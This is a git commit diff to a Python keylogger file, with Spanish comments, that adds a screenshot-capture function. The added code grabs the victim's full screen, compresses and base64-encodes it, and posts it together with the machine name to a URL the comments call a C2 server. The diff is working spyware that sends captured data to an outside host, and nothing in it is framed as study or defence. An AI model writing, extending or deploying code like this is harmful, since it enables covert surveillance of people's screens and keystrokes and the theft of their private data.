8539d8974c8721cf210dec44c6d1852b2249ab35
Jesus Enrique Herrera Bautista <229161133+akdmjeau-eng@users.noreply.github.com>
2026-03-26 12:14:12 -0600

    Actualizar keyloger.py

--- keyloger.py
+++ keyloger.py
@@ -1,4 +1,22 @@
 import os, sys
+from PIL import ImageGrab
+import base64
+from io import BytesIO
+
+def take_screenshot():
+    # Capturar la pantalla completa
+    screenshot = ImageGrab.grab()
+    
+    # Comprimir la imagen para que viaje rápido
+    buffer = BytesIO()
+    screenshot.save(buffer, format="JPEG", quality=50)
+    
+    # Convertir a Base64 para enviarla por HTTP POST
+    img_str = base64.b64encode(buffer.getvalue()).decode()
+    
+    # Enviar al servidor C2
+    url = "https://tu-url-cloudflare.com/upload_img.php"
+    requests.post(url, data={'host': os.getenv('COMPUTERNAME'), 'img': img_str})
 
 def send_data(keys):
     try:
